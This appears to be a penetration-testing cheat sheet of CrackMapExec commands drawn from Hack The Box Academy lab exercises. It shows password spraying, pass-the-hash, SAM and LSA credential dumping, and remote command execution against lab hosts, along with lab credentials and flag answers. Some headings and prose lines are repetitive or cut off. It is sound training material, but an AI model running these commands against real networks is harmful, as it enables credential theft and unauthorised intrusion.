# CrackMapExec

% cme, crackmapexec, smb, cpts

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - logged-on-users
#cat/RECON #cpts
We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.

```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - enumerating-the-password-policy---from-linux---credentialed
#cat/RECON #cpts
As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the

```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - using-crackmapexec---users-flag
#cat/RECON #cpts
Password Spraying - Making a Target User List

```
crackmapexec smb 172.16.5.5 --users
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - using-crackmapexec-with-valid-credentials
#cat/RECON #cpts
Password Spraying - Making a Target User List

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - using-crackmapexec-filtering-logon-failures
#cat/RECON #cpts
Internal Password Spraying - from Linux

```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - validating-the-credentials-with-crackmapexec
#cat/RECON #cpts
Internal Password Spraying - from Linux

```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - local-admin-spraying-with-crackmapexec
#cat/RECON #cpts
Internal Password Spraying - from Linux

```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - cme-help-menu
#cat/RECON #cpts
Credentialed Enumeration - from Linux

```
crackmapexec -h
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - cme-help-menu-2
#cat/RECON #cpts
Credentialed Enumeration - from Linux

```
ssh own stuff using SSH
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - cme---domain-user-enumeration
#cat/RECON #cpts
We start by pointing CME at the Domain Controller and using the credentials for the `forend` user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as t

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - cme---domain-group-enumeration
#cat/RECON #cpts
Credentialed Enumeration - from Linux

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - share-enumeration---domain-controller
#cat/RECON #cpts
Credentialed Enumeration - from Linux

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - spider_plus
#cat/RECON #cpts
Credentialed Enumeration - from Linux

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - testing-authentication-against-a-domain-controller
#cat/RECON #cpts
Kerberoasting - from Linux

```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - brute-forcing-and-password-spray
#cat/RECON #cpts
Attacking SMB

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - crackmapexec
#cat/RECON #cpts
Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the

```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - enumerating-logged-on-users
#cat/RECON #cpts
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network

```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - extract-hashes-from-sam-database
#cat/RECON #cpts
The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - pass-the-hash-pth
#cat/RECON #cpts
If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote se

```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/RECON #cpts
Afterward, students need to use `ProxyChains` to run commands against the 172.16.6.0/24 network. Students will need to authenticate to SMB on 172.16.6.50 uitilizing the credentials `svc_sql:lucky7`:

```
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/RECON #cpts
```
└──╼ [★]$ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/RECON #cpts
Then, using `crackmapexec`, students can read the flag file from the directory `C:\users\administrator\desktop\`, finding it to be `spn$_r0ast1ng_on_@n_0p3n_f1re`:

```
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-4
#cat/RECON #cpts
```
└──╼ [★]$ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - find-cleartext-credentials-for-another-domain-user-submit-the-username
#cat/RECON #cpts
```
└──╼ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-5
#cat/RECON #cpts
The cleartext password for `mssqlsvc` is revealed to be `Sup3rS3cur3maY5ql$3rverE`. Alternatively, students can run `crackmapexec` as the local administrator to find the cleartext password on the Parrot OS jump-box:

```
sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-6
#cat/RECON #cpts
```
└──╼ $ sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - what-is-the-membercount-of-the-interns-group
#cat/RECON #cpts
Using the same SSH connection established in the previous question, students need to use `CrackMapExec` to enumerate groups to find the `membercount` of the `Interns` group, using the credentials `forend:Klmcargo2`:

```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - what-is-the-membercount-of-the-interns-group-2
#cat/RECON #cpts
```
└──╼ $crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - leveraging-known-vulnerabilities
#cat/RECON #cpts
Once logged in, we can explore a bit, but we know that this is likely vulnerable to a command injection flaw so let's get right to it. This excellent [blog post](https://www.codewatch.org/blog/?p=453) by the individual w

```
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - attack-the-prtg-target-and-gain-remote-code-execution-submit-the-conte
#cat/RECON #cpts
```
└──╼ [★]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - confirming-local-admin-access-on-domain-controller
#cat/RECON #cpts
From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

```
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - find-a-backup-script-that-contains-the-password-for-the-backupadm-user
#cat/RECON #cpts
Thereon, students need to use `crackmapexec` (on `Pwnbox`, students need to switch users to root to be able to use `crackmapexec`) to enumerate the "Department Shares" share, proxying through `proxychains`:

```
sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Pwned123 -M spider_plus --share 'Department Shares'
```

## CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - CrackMapExec - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-2
#cat/RECON #cpts
```
└──╼ # sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Pwned123 -M spider_plus --share 'Department Shares'
```

